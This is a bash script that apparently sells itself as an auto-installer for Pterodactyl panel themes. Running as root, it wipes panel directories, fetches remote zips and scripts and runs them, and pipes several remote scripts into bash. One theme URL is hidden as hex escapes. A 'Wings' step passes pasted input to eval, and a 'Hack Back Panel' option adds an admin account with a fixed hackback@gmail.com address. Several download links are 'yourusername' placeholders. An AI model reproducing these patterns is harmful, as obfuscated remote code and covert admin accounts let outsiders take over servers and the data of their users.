#!/bin/bash

BLUE='\033[0;34m'       
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

display_welcome() {
  echo -e ""
  echo -e "${RED}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                                                 [+]${NC}"
  echo -e "${YELLOW}[+]                AUTO INSTALLER THEMA             [+]${NC}"
  echo -e "${BLUE}[+]                  ©  INSTALLER                [+]${NC}"
  echo -e "${GREEN}[+]                                                 [+]${NC}"
  echo -e "${RED}[+] =============================================== [+]${NC}"
  echo -e ""
  echo -e "ZEEDUN STORE INDONESIA"
  echo -e ""
  sleep 4
  clear
}
 
install_jq() {
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]             UPDATE & INSTALL SERVER             [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  sudo apt update && sudo apt install -y jq
  if [ $? -eq 0 ]; then
    echo -e "                                                       "
    echo -e "${GREEN}[+] =============================================== [+]${NC}"
    echo -e "${GREEN}[+]              INSTALL UPDATE BERHASIL            [+]${NC}"
    echo -e "${GREEN}[+] =============================================== [+]${NC}"
  else
    echo -e "                                                       "
    echo -e "${RED}[+] =============================================== [+]${NC}"
    echo -e "${RED}[+]              INSTALL UPDATE GAGAL               [+]${NC}"
    echo -e "${RED}[+] =============================================== [+]${NC}"
    exit 1
  fi
  echo -e "                                                       "
  sleep 1
  clear
}

check_token() {
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                 LICENSE ZEEDUN                    [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  echo -e "${YELLOW}MASUKAN AKSES TOKEN :${NC}"
  read -r USER_TOKEN

  if [ "$USER_TOKEN" = "Zeedun" ]; then
    echo -e "${GREEN}AKSES BERHASIL${NC}"
  else
    echo -e "${RED}ZEEDUN | TIDAK UNTUK DIJUAL BELIKAN${NC}"
    exit 1
  fi
  clear
}

clean_previous_theme() {
  echo -e "${YELLOW}[+] Membersihkan theme sebelumnya...${NC}"
  
  if [ -e /root/pterodactyl ]; then
    sudo rm -rf /root/pterodactyl
  fi
  
  cd /var/www/pterodactyl
  php artisan down
  
  sudo rm -rf /var/www/pterodactyl/resources/scripts/components/*
  sudo rm -rf /var/www/pterodactyl/resources/scripts/api/*
  sudo rm -rf /var/www/pterodactyl/resources/views/*
  sudo rm -rf /var/www/pterodactyl/public/assets/*
  
  echo -e "${GREEN}[+] Pembersihan selesai${NC}"
}

detect_theme_structure() {
  local extract_dir="$1"
  
  if [ -d "$extract_dir/pterodactyl" ]; then
    echo "$extract_dir/pterodactyl"
  elif [ -d "$extract_dir/app" ] && [ -d "$extract_dir/resources" ]; then
    echo "$extract_dir"
  else
    local subdir=$(find "$extract_dir" -mindepth 1 -maxdepth 1 -type d | head -n 1)
    if [ -d "$subdir/app" ] && [ -d "$subdir/resources" ]; then
      echo "$subdir"
    else
      echo "$extract_dir"
    fi
  fi
}

install_theme() {
  while true; do
    echo -e "                                                       "
    echo -e "${GREEN}[+] =============================================== [+]${NC}"
    echo -e "${GREEN}[+]                   SELECT THEME                  [+]${NC}"
    echo -e "${GREEN}[+] =============================================== [+]${NC}"
    echo -e "                                                       "
    echo -e "PILIH THEME YANG INGIN DI INSTALL"
    echo "1. Ultra Theme"
    echo "2. Cheese Theme"
    echo "3. Glasmorphism Theme"
    echo "4. Eleganty Theme"
    echo "5. HI Theme"
    echo "6. Billing"
    echo "7. Enigma"
    echo "8. Futuristic Theme"
    echo "9. Kunefe Theme"
    echo "10. Nebula"
    echo "11. Pterodactyl Theme - Pure UI Light + Dark"
    echo "12. Stellar"
    echo "13. Theme Midnight v1.4.3"
    echo "14. Unix Theme v2.71"
    echo "15. Custom Theme"
    echo "x. Kembali"
    echo -e "Masukan pilihan (1-15/x) :"
    read -r SELECT_THEME
    
    case "$SELECT_THEME" in
      1)
        THEME_URL="https://github.com/yourusername/themes/raw/main/1.%20Ultra%20Theme.zip"
        THEME_NAME="Ultra Theme"
        THEME_TYPE="standard"
        break
        ;;
      2)
        THEME_URL="https://github.com/yourusername/themes/raw/main/2.%20Cheese%20Theme.zip"
        THEME_NAME="Cheese Theme"
        THEME_TYPE="standard"
        break
        ;;
      3)
        THEME_URL="https://github.com/yourusername/themes/raw/main/3.%20Glasmorphism%20Theme.zip"
        THEME_NAME="Glasmorphism Theme"
        THEME_TYPE="standard"
        break
        ;;
      4)
        THEME_URL="https://github.com/yourusername/themes/raw/main/4.%20Eleganty%20Theme.zip"
        THEME_NAME="Eleganty Theme"
        THEME_TYPE="standard"
        break
        ;;
      5)
        THEME_URL="https://github.com/yourusername/themes/raw/main/5.%20HI%20Theme.zip"
        THEME_NAME="HI Theme"
        THEME_TYPE="standard"
        break
        ;;
      6)
        THEME_URL=$(echo -e "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x44\x49\x54\x5A\x5A\x31\x31\x32\x2F\x66\x6F\x78\x78\x68\x6F\x73\x74\x74\x2F\x72\x61\x77\x2F\x6D\x61\x69\x6E\x2F\x43\x31\x2E\x7A\x69\x70")
        THEME_NAME="Billing"
        THEME_TYPE="billing"
        break
        ;;
      7)
        THEME_URL="https://setting.zeedunhost.my.id/enigma.zip"
        THEME_NAME="Enigma"
        THEME_TYPE="enigma"
        break
        ;;
      8)
        THEME_URL="https://github.com/yourusername/themes/raw/main/Futuristic%20Theme.zip"
        THEME_NAME="Futuristic Theme"
        THEME_TYPE="standard"
        break
        ;;
      9)
        THEME_URL="https://github.com/yourusername/themes/raw/main/kunefe-theme.zip"
        THEME_NAME="Kunefe Theme"
        THEME_TYPE="standard"
        break
        ;;
      10)
        THEME_URL="https://setting.zeedunhost.my.id/nebula.sh"
        THEME_NAME="Nebula"
        THEME_TYPE="nebula"
        break
        ;;
      11)
        THEME_URL="https://github.com/yourusername/themes/raw/main/Pterodactyl%20Theme%20-%20Pure%20UI%20Light%20%2B%20Dark.zip"
        THEME_NAME="Pterodactyl Pure UI"
        THEME_TYPE="standard"
        break
        ;;
      12)
        THEME_URL="https://setting.zeedunhost.my.id/stellar.zip"
        THEME_NAME="Stellar"
        THEME_TYPE="standard"
        break
        ;;
      13)
        THEME_URL="https://github.com/yourusername/themes/raw/main/theme_midnight-_v1.4.3.zip"
        THEME_NAME="Theme Midnight v1.4.3"
        THEME_TYPE="standard"
        break
        ;;
      14)
        THEME_URL="https://github.com/yourusername/themes/raw/main/Unix_Theme_v2.71.zip"
        THEME_NAME="Unix Theme v2.71"
        THEME_TYPE="standard"
        break
        ;;
      15)
        echo -e "${YELLOW}Masukkan link download theme custom (URL): ${NC}"
        read -r CUSTOM_THEME_URL
        THEME_URL="$CUSTOM_THEME_URL"
        THEME_NAME="Custom Theme"
        THEME_TYPE="standard"
        break
        ;;
      x)
        return
        ;;
      *)
        echo -e "${RED}Pilihan tidak valid, silahkan coba lagi.${NC}"
        ;;
    esac
  done
  
  clean_previous_theme
  
  THEME_FILE="theme.zip"
  if [ "$THEME_TYPE" = "nebula" ]; then
    THEME_FILE="nebula.sh"
  fi
  
  echo -e "${YELLOW}[+] Downloading $THEME_NAME...${NC}"
  wget -q "$THEME_URL" -O "/root/$THEME_FILE"
  
  if [ "$THEME_TYPE" = "nebula" ]; then
    echo -e "                                                       "
    echo -e "${GREEN}[+] =============================================== [+]${NC}"
    echo -e "${GREEN}[+]                  INSTALLASI THEMA               [+]${NC}"
    echo -e "${GREEN}[+] =============================================== [+]${NC}"
    echo -e "                                                       "
    chmod +x "/root/$THEME_FILE"
    bash "/root/$THEME_FILE"
    sudo rm "/root/$THEME_FILE"
  else
    mkdir -p /root/pterodactyl_temp
    sudo unzip -o "/root/$THEME_FILE" -d /root/pterodactyl_temp
    
    THEME_SOURCE=$(detect_theme_structure "/root/pterodactyl_temp")
    
    if [ "$THEME_TYPE" = "billing" ]; then
      echo -e "                                                       "
      echo -e "${GREEN}[+] =============================================== [+]${NC}"
      echo -e "${GREEN}[+]                  INSTALLASI THEMA               [+]${NC}"
      echo -e "${GREEN}[+] =============================================== [+]${NC}"
      echo -e "                                                       "
      sudo cp -rfT "$THEME_SOURCE" /var/www/pterodactyl
      curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
      sudo apt install -y nodejs
      npm i -g yarn
      cd /var/www/pterodactyl
      yarn add react-feather
      php artisan billing:install stable
      php artisan migrate
      yarn build:production
      php artisan view:clear
      sudo rm "/root/$THEME_FILE"
      sudo rm -rf /root/pterodactyl_temp
      
    elif [ "$THEME_TYPE" = "enigma" ]; then
      echo -e "                                                       "
      echo -e "${GREEN}[+] =============================================== [+]${NC}"
      echo -e "${GREEN}[+]                  INSTALLASI THEMA               [+]${NC}"
      echo -e "${GREEN}[+] =============================================== [+]${NC}"
      echo -e "                                                       "
      
      echo -e "${YELLOW}Masukkan link wa (https://wa.me...) : ${NC}"
      read -r LINK_WA
      echo -e "${YELLOW}Masukkan link group (https://.....) : ${NC}"
      read -r LINK_GROUP
      echo -e "${YELLOW}Masukkan link channel (https://...) : ${NC}"
      read -r LINK_CHNL

      if [ -f "$THEME_SOURCE/resources/scripts/components/dashboard/DashboardContainer.tsx" ]; then
        sudo sed -i "s|LINK_WA|$LINK_WA|g" "$THEME_SOURCE/resources/scripts/components/dashboard/DashboardContainer.tsx"
        sudo sed -i "s|LINK_GROUP|$LINK_GROUP|g" "$THEME_SOURCE/resources/scripts/components/dashboard/DashboardContainer.tsx"
        sudo sed -i "s|LINK_CHNL|$LINK_CHNL|g" "$THEME_SOURCE/resources/scripts/components/dashboard/DashboardContainer.tsx"
      fi

      sudo cp -rfT "$THEME_SOURCE" /var/www/pterodactyl
      curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
      sudo apt install -y nodejs
      sudo npm i -g yarn
      cd /var/www/pterodactyl
      yarn add react-feather
      php artisan migrate
      yarn build:production
      php artisan view:clear
      sudo rm "/root/$THEME_FILE"
      sudo rm -rf /root/pterodactyl_temp
      
    else
      echo -e "                                                       "
      echo -e "${GREEN}[+] =============================================== [+]${NC}"
      echo -e "${GREEN}[+]                  INSTALLASI $THEME_NAME         [+]${NC}"
      echo -e "${GREEN}[+] =============================================== [+]${NC}"
      echo -e "                                                       "
      
      sudo cp -rfT "$THEME_SOURCE" /var/www/pterodactyl
      curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
      sudo apt install -y nodejs
      sudo npm i -g yarn
      cd /var/www/pterodactyl
      yarn add react-feather
      php artisan migrate
      yarn build:production
      php artisan view:clear
      sudo rm "/root/$THEME_FILE"
      sudo rm -rf /root/pterodactyl_temp
    fi
  fi

  php artisan up
  
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                   INSTALL SUCCESS               [+]${NC}"
  echo -e "${GREEN}[+]            $THEME_NAME BERHASIL DIINSTALL       [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e ""
  sleep 2
  clear
}

uninstall_theme() {
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                    DELETE THEME                 [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  bash <(curl -s https://raw.githubusercontent.com/VallzHost/installer-theme/main/repair.sh)
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                 DELETE THEME SUKSES             [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  sleep 2
  clear
}

create_node() {
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                    CREATE NODE                     [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "

  read -p "Masukkan nama lokasi: " location_name
  read -p "Masukkan deskripsi lokasi: " location_description
  read -p "Masukkan domain: " domain
  read -p "Masukkan nama node: " node_name
  read -p "Masukkan RAM (dalam MB): " ram
  read -p "Masukkan jumlah maksimum disk space (dalam MB): " disk_space
  read -p "Masukkan Locid: " locid

  cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }

  php artisan p:location:make <<EOF
$location_name
$location_description
EOF

  php artisan p:node:make <<EOF
$node_name
$location_description
$locid
https
$domain
yes
no
no
$ram
$ram
$disk_space
$disk_space
100
8080
2022
/var/lib/pterodactyl/volumes
EOF

  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]        CREATE NODE & LOCATION SUKSES             [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  sleep 2
  clear
}

uninstall_panel() {
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                    UNINSTALL PANEL                 [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "

  bash <(curl -s https://pterodactyl-installer.se) <<EOF
y
y
y
y
EOF

  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                 UNINSTALL PANEL SUKSES             [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  sleep 2
  clear
}

configure_wings() {
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                    CONFIGURE WINGS                 [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "

  read -p "Masukkan token Configure menjalankan wings: " wings_token

  eval "$wings_token"
  
  sudo systemctl start wings

  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                 CONFIGURE WINGS SUKSES             [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  sleep 2
  clear
}

hackback_panel() {
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                    HACK BACK PANEL                 [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  
  read -p "Masukkan Username Panel: " user
  read -p "Password login: " psswdhb
  
  cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }

  php artisan p:user:make <<EOF
yes
hackback@gmail.com
$user
$user
$user
$psswdhb
EOF

  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "${GREEN}[+]                 AKUN TELAH DI ADD             [+]${NC}"
  echo -e "${GREEN}[+] =============================================== [+]${NC}"
  echo -e "                                                       "
  sleep 2
  clear
}

display_welcome
install_jq
check_token

while true; do
  clear
  echo -e "                                                                     "
  echo -e "${RED}        _,gggggggggg.                                     ${NC}"
  echo -e "${RED}    ,ggggggggggggggggg.                                   ${NC}"
  echo -e "${RED}  ,ggggg        gggggggg.                                 ${NC}"
  echo -e "${RED} ,ggg'               'ggg.                                ${NC}"
  echo -e "${RED}',gg       ,ggg.      'ggg:                               ${NC}"
  echo -e "${RED}'ggg      ,gg'''  .    ggg       Auto Installer Zeedun Host  ${NC}"
  echo -e "${RED}gggg      gg     ,     ggg      ------------------------  ${NC}"
  echo -e "${RED}ggg:     gg.     -   ,ggg       • Telegram : ZeedunHost      ${NC}"
  echo -e "${RED} ggg:     ggg._    _,ggg        • Creadit  : ZeedunHost      ${NC}"
  echo -e "${RED} ggg.    '.'''ggggggp           • Support by ZeedunHost      ${NC}"
  echo -e "${RED}  'ggg    '-.__                                           ${NC}"
  echo -e "${RED}    ggg                                                   ${NC}"
  echo -e "${RED}      ggg                                                 ${NC}"
  echo -e "${RED}        ggg.                                              ${NC}"
  echo -e "${RED}          ggg.                                            ${NC}"
  echo -e "${RED}             b.                                           ${NC}"
  echo -e "                                                                     "
  echo -e "BERIKUT LIST INSTALL :"
  echo "1. Install theme"
  echo "2. Uninstall theme"
  echo "3. Configure Wings"
  echo "4. Create Node"
  echo "5. Uninstall Panel"
  echo "6. Hack Back Panel"
  echo "x. Exit"
  echo -e "Masukkan pilihan (1/2/3/4/5/6/x):"
  read -r MENU_CHOICE
  clear

  case "$MENU_CHOICE" in
    1)
      install_theme
      ;;
    2)
      uninstall_theme
      ;;
    3)
      configure_wings
      ;;
    4)
      create_node
      ;;
    5)
      uninstall_panel
      ;;
    6)
      hackback_panel
      ;;
    x)
      echo "Keluar dari skrip."
      exit 0
      ;;
    *)
      echo "Pilihan tidak valid, silahkan coba lagi."
      sleep 2
      ;;
  esac
done